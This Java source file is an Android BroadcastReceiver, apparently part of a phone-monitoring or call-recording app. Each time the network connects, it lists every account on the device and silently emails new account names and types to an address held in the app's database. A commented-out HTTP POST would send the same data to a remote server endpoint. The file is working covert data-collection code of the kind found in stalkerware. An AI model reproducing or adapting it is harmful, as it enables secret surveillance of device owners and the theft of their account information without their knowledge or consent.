package voluntaty.com.base;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;

import com.voluntary.database.DataHelper;
import com.voluntary.record.audio.phone.SendMailTask;

import org.apache.http.NameValuePair;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicResponseHandler;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

/**
 * Created by supergoga on 1/28/2016.
 */
public class RepeatingAlarmServiceAccount extends BroadcastReceiver {


    private DataHelper dh;

    String login=null;
    String email=null;
    String password=null;
    String URL_HTTP=null;

    public static boolean isNetworkConnectedOrConnecting(Context context) {
        final ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        final NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        return networkInfo != null && networkInfo.isConnectedOrConnecting();
    }
    @Override
    public void onReceive(Context context, Intent intent) {
        if (isNetworkConnectedOrConnecting(context.getApplicationContext())) {
            someTask(context);
        }
    }


    void someTask(Context context) {

        AccountManager manager =(AccountManager)context.getSystemService(context.ACCOUNT_SERVICE);
        Account[] accounts =manager.getAccounts();
        for (Account account : accounts) {
            String accounttype = null;
            dh = null;
            dh = new DataHelper(context);
            URL_HTTP = dh.selectUrl_Http();
            String strt1 = null;
            strt1 = dh.selectGps();
            login = dh.selectLogin();
            email = dh.selectEmail();
            password = dh.selectPassword();
            accounttype = dh.selectAccountType(account.type);
            int dlina = accounttype.length();
            if (dlina < 1) {
                dh.InsertAccountType(account.type);
                //	 Toast.makeText(getApplicationContext(),URL_HTTP+""+email+ "" + account.name+ "" + account.type, Toast.LENGTH_LONG).show();
                //	 (URL_HTTP,email, "" + account.name, "" + account.type);
                   //          new RequestTask().execute(URL_HTTP,email, "" + account.name, "" + account.type);


                List<String> toEmailList = Arrays.asList(email.split("\\s*,\\s*"));
                new SendMailTask().execute(email,password,toEmailList, "Spisok Account", "&" + account.name+ "" + account.type);



            }

            dh = null;
            URL_HTTP = null;
            strt1 = null;
            login = null;
            email = null;
            password = null;

            accounttype = null;
        }
    }

    class RequestTask extends AsyncTask<String, String, String> {
        private String str2=null;

        @Override
        protected String doInBackground(String... params) {

            try {
                // создаем запрос на сервер
                DefaultHttpClient hc = new DefaultHttpClient();
                ResponseHandler<String> res = new BasicResponseHandler();
                // он у нас будет посылать post запрос
                HttpPost postMethod = new HttpPost(params[0]+"/index.php/api/account");
                // будем передавать два параметра
                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(3);
                //0
                nameValuePairs.add(new BasicNameValuePair("email",params[1]));
                nameValuePairs.add(new BasicNameValuePair("name",params[2]));
                nameValuePairs.add(new BasicNameValuePair("type",params[3]));

                // собераем их вместе и посылаем на сервер
                postMethod.setEntity(new UrlEncodedFormEntity(nameValuePairs,"UTF-8"));
                // получаем ответ от сервера
                String response = hc.execute(postMethod, res);

                //	JSONURL(response.toString());

            } catch (Exception e) {
                System.out.println("Exp=" + e);
            }



            return null;
        }

        @Override
        protected void onPostExecute(String result) {

            //dialog.dismiss();
            super.onPostExecute(result);
            // 			Toast.makeText(getApplicationContext()," ?? "+str2, Toast.LENGTH_LONG).show();
        }

        @Override
        protected void onPreExecute() {

            super.onPreExecute();
        }
    }

}

